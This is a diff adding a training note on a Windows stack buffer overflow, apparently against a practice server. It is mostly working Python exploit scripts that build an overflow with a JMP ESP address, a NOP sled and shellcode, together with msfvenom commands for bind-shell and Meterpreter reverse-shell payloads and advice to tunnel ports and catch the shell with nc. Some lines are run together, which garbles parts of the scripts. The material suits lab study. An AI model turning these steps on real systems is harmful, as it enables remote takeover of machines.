@@ -1,0 +1,86 @@
+#DAY 5 BUFFER OVERFLOW ON WINDOWS
+#STEPS 
+_______________________________________________________________________________________
+
+#make sure gbd installed already do not install anything not allowed
+put script in tmp directory
+after putting the script onto the machine do the info proc map process again'''
+Windows
+get exe onto the windows op station then run it in immunity debugger
+get whatever port it opens and make a socket to find how much the offset is then test
+	FINDING THE OFFSET
+		#!/usr/bin/python		import socket
+		import os
+		import sys		host = "192.168.1.129"
+		port = 9999		buffer = "amount from wiremask.eu"
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,port))
+		print s.recv(1024)
+		print "[+] Sending exploit..."
+		s.send("TRUN /.:/ " + buffer)
+		print s.recv(1024)
+		s.close()
+	
+	
+	TESTING THE OFFSET
+		#!/usr/bin/python		import socket
+		import os
+		import sys		host = "192.168.1.129"
+		port = 9999		buffer = "A"*2002
+		buffer += "BBBB"
+		buffer += "C"*(5000-len(buffer))		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,port))
+		print s.recv(1024)
+		print "[+] Sending exploit..."
+		s.send("TRUN /.:/ " + buffer)
+		print s.recv(1024)
+		s.close()	FINDING THE BAD CHARS	(most likely 0x00)	
+		#!/usr/bin/python		import socket
+		import os
+		import sys		host = "192.168.1.129"
+		port = 9999
+		badchars = ("<!mons bytearray in immunity debugger>")
+		buffer = "A"*2002
+		buffer += "BBBB"
+		buffer += badchars
+		buffer += "C"*(5000-len(buffer))		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,port))
+		print s.recv(1024)
+		print "[+] Sending exploit..."
+		s.send("TRUN /.:/ " + buffer)
+		print s.recv(1024)
+		s.close()
+		
+	!mona jmp -r esp -m "essfunc.dll" to get the jmp esp
+	then create the shell code with:
+		msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
+			###alternate way###msfvenom
+			use multi/handler
+			set payload windows/meterpreter/reverse_tcp
+			set lhost 0.0.0.0
+			set lport 4444
+			msfvenom -p windows/meterpreter/reverse_tcp lhost=<linux ip>
+			
+			
+			import socket
+			import os
+			import sys			host = "192.168.1.129"
+			port = 9999			# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
+			# Payload size: 355 bytes
+			shellcode = "SHELLCODE GIVEN"
+			buffer = "A"*2002
+			buffer += "\xAF\x11\x50\x62"        # 625011AF   JMP ESP from essfunc.dll
+			buffer += "\x90"*16                 # nopsled
+			buffer += shellcode
+			buffer += "C"*(5000-len(buffer))			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((host,port))
+			print s.recv(1024)
+			print "[+] Sending exploit..."
+			s.send("TRUN /.:/ " + buffer)
+			print s.recv(1024)
+			s.close()
+			test on the win ops then when test successful do it on what you are trying to exploit
+			may need tunnels to the 4444 and 9999 ports(most likely do)
+			open a nc connection on that tunnel
+			
+'''
